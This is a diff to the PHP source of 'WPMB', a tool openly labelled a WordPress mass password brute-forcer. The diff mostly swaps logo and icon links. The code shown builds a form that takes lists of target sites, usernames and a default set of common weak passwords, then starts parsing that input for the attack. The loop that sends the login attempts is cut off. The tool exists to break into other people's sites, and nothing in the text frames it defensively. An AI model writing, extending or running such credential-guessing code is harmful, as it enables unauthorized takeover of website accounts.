@@ -13,7 +13,7 @@ ignore_user_abort(true);
 <!-- fb.com/B10S-1309549119165925  --> 
 <html xmlns="http://www.w3.org/1999/xhtml" lang="en"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8" /> 
 <title>WPMB By (B10S)</title> 
-<link rel="fluid-icon" href="https://lh5.googleusercontent.com/OcCKV6hPCJ5mZRi10xYenLK--OptsMhPWCIOG62DtWGpjthGSJpSJYJTWXqviR9gJsVWZ6CruBScrZc=w1280-h918"> 
+<link rel="icon" href="https://raw.githubusercontent.com/8105/WPMB/master/WPMB-32.png" type="image/x-icon"> 
 <style type="text/css">textarea{padding:7px 14px;height:312px;color:#2e4453;font-size:16px;font-weight:normal;line-height:1.5;border:1px solid#c8d7e1; 
 background-color:white;box-shadow:none;transition:all.15s ease-in-out;} 
 #brd{border:1px solid black;border-collapse:collapse;padding:5px} 
@@ -26,15 +26,13 @@ input{width:45%;background:#00aadc;border-color:#0087be;color:white;border-style
 font-size:14px;line-height:1.3;border-radius:4px;padding:10px 16px;}</style></head><body bgcolor="#e9eff3"><center> 
 <div id="login" style="width:65%;height:50%"> 
 <h1><a href="https://goo.gl/A16JAU" title="Tool In GitHub" tabindex="-1">~:: Mass PW Brut ::~</a></h1> 
-<img src="https://lh5.googleusercontent.com/OcCKV6hPCJ5mZRi10xYenLK--OptsMhPWCIOG62DtWGpjthGSJpSJYJTWXqviR9gJsVWZ6CruBScrZc=w1280-h918" width="200" title="WPMB By (8105) !  ;-}" /> 
+<img src="https://raw.githubusercontent.com/8105/WPMB/master/8105.png" width="200" title="WPMB By (8105) !  ;-}" /> 
 <form class="form" method="post"><table cellspacing="0" cellpadding="0"><center> 
 <tr><td><div id="FIN">List Site :</div></td><td><div id="FIN">User Names </div></td><td><div id="FIN">Pass Words</div></td></tr>
 <tr><td><textarea name=s>http://example.com/blog</textarea></td><td><textarea name=u>admin</textarea></td> 
 <td><textarea name=p><?="admin\n123456\n123123\nadmin123\npassword1\nabc123\n12341234\nquerty\npass\nadministrator"?></textarea></td> 
 </tr></center></table><p><input type="submit" name="sub" value="<=  Brut Now  =>" /></p></form></div><?php 
-if($_POST){ 
-echo"<table id='brd'><tr id='brd'><td id='brd'>Addr</td>
-<td id='brd'>User</td><td id='brd'>Pass</td><td id='brd'>Req Type</td><td id='brd'>Action</td></tr>"; 
+if($_POST){echo"<table id='brd'><tr id='brd'><td id='brd'>Addr</td><td id='brd'>User</td><td id='brd'>Pass</td><td id='brd'>Req Type</td><td id='brd'>Action</td></tr>"; 
 $s=explode("\n",str_replace("\r",'',$_POST['s'])); 
 $u=explode("\n",str_replace("\r",'',$_POST['u'])); 
 $p=explode("\n",str_replace("\r",'',$_POST['p'])); 
